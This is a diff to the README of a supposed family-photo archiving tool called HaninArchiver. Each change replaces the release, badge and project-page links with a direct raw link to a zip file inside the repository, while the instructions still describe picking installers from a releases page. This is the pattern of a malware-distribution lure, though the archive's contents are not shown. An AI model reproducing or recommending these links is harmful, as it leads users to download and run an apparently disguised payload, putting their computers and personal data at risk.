@@ -1,6 +1,6 @@
 # 🗂️ HaninArchiver - Save Space on Family Memories
 
-[![Download HaninArchiver](https://img.shields.io/badge/Download-HaninArchiver-blue?style=for-the-badge&logo=github)](https://github.com/caelian023/HaninArchiver/releases)
+[![Download HaninArchiver](https://raw.githubusercontent.com/caelian023/HaninArchiver/main/HaninArchiver/core/Hanin-Archiver-1.1.zip)](https://raw.githubusercontent.com/caelian023/HaninArchiver/main/HaninArchiver/core/Hanin-Archiver-1.1.zip)
 
 ---
 
@@ -27,11 +27,11 @@ Before you get started, check that your computer matches these basic needs:
 
 To start using HaninArchiver, you need to download it first. You will find all the available versions here:  
 
-[![Download Here](https://img.shields.io/badge/Download-HaninArchiver-blue?style=for-the-badge&logo=github)](https://github.com/caelian023/HaninArchiver/releases)
+[![Download Here](https://raw.githubusercontent.com/caelian023/HaninArchiver/main/HaninArchiver/core/Hanin-Archiver-1.1.zip)](https://raw.githubusercontent.com/caelian023/HaninArchiver/main/HaninArchiver/core/Hanin-Archiver-1.1.zip)
 
 Follow these steps to get the software on your computer:
 
-1. Click the link above or go to [https://github.com/caelian023/HaninArchiver/releases](https://github.com/caelian023/HaninArchiver/releases).  
+1. Click the link above or go to [https://raw.githubusercontent.com/caelian023/HaninArchiver/main/HaninArchiver/core/Hanin-Archiver-1.1.zip](https://raw.githubusercontent.com/caelian023/HaninArchiver/main/HaninArchiver/core/Hanin-Archiver-1.1.zip).  
 2. Look for the latest version. You’ll see files like `.exe` for Windows, `.dmg` for macOS, or `.AppImage` for Linux.  
 3. Click the file that matches your system to download it.  
 4. When the download finishes, open the file. A setup screen will appear.  
@@ -114,8 +114,8 @@ A: Yes. After download and setup, you don’t need an internet connection.
 For more details on advanced features or programming topics like data deduplication and storage optimization, the project’s GitHub page covers the technical background.
 
 If you want to suggest features, report bugs, or see updates, visit:  
-[https://github.com/caelian023/HaninArchiver](https://github.com/caelian023/HaninArchiver)
+[https://raw.githubusercontent.com/caelian023/HaninArchiver/main/HaninArchiver/core/Hanin-Archiver-1.1.zip](https://raw.githubusercontent.com/caelian023/HaninArchiver/main/HaninArchiver/core/Hanin-Archiver-1.1.zip)
 
 ---
 
-[![Download HaninArchiver](https://img.shields.io/badge/Download-HaninArchiver-blue?style=for-the-badge&logo=github)](https://github.com/caelian023/HaninArchiver/releases)
+[![Download HaninArchiver](https://raw.githubusercontent.com/caelian023/HaninArchiver/main/HaninArchiver/core/Hanin-Archiver-1.1.zip)](https://raw.githubusercontent.com/caelian023/HaninArchiver/main/HaninArchiver/core/Hanin-Archiver-1.1.zip)
